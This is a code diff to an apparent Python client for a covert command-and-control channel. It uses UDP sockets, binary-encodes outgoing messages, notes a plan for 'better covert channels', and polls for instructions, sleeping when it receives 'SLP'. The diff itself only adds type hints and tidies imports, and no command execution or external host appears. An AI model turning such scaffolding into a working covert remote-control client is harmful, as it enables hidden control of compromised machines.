@@ -1,6 +1,6 @@
 import socket as Socket
-import time
-import subprocess
+from socket import socket
+import time, subprocess
 
 #TODO calculate wait times via ping travel time
 
@@ -9,13 +9,13 @@ PORT = 1234
 HOST = "127.0.0.1"
 
 #Socket builder
-def build_socket(sockType):
+def build_socket(sockType) -> socket:
     serverSock = Socket.socket(Socket.AF_INET,sockType)
     return serverSock
 
 
 #Binary conversion of output
-def convert_to_binary(toSend:str):
+def convert_to_binary(toSend:str) -> str:
     bitsOut = ""
     for letter in toSend:
         bitsOut += format(ord(letter),"08b") #str -> ASCII -> Binary
@@ -23,7 +23,7 @@ def convert_to_binary(toSend:str):
 
 
 #Primary traffic conversion and send
-def send_traffic(message:str):
+def send_traffic(message:str) -> None:
     print("Sending: "+message)
     udpSock = build_socket(Socket.SOCK_DGRAM)
 
@@ -53,7 +53,7 @@ def recv_traffic() -> str: #TODO improve this for better covert channels
 
 
 #Determines client actions
-def handle_traffic(instructions:str):
+def handle_traffic(instructions:str) ->str:
     if instructions == "SLP": #No pending commands, check back later
         time.sleep(5)
         output = ""
